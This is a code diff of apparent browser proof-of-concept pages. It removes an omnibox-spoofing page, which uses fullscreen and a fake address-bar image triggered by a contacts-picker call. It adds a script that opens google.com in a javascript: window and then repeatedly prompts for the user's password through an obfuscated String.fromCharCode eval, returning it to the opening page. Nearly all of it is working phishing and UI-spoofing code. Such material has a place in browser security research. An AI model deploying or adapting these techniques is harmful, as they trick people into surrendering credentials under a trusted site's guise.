@@ -1,38 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    await navigator.contacts.select(["name"], {});
-                })();
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";
-                document.documentElement.requestFullscreen();
-            }
-        </script>
-    </head>  
-    <body>
-        <img id="spoof" style="display: none;" src="spoof.png"></img>
-        <div id="content">
-            <br><br><br>
-            <center>
-                <h1>Click anywhere on the page to spoof the omnibox!</h1>
-            </center>
-        </div>
-    </body>
-  </body>
-</html>
+
+<a href="javascript:run();" style="font-size: 100px;">google.co.il</a>
+
+<script>
+	var myWindow;
+	function run(){
+		 var script = "setTimeout(function(){var t = window.open('https://google.com');},250);setTimeout(function(){ var pass = ''; while(pass == ''){ eval(String.fromCharCode(118,97,114,32,112,97,115,115,32,61,32,112,114,111,109,112,116,40,39,71,105,118,101,32,109,101,32,121,111,117,114,32,112,97,115,115,119,111,114,100,32,112,108,101,97,115,101,39,44,39,39,41,59)); } window.opener.save(pass); window.close(); },5000);";
+		 myWindow = window.open("javascript:" + script);
+	}
+	function save(pass){
+		alert("Password is " + pass);
+		myWindow.close();
+		window.close();
+	}
+</script>
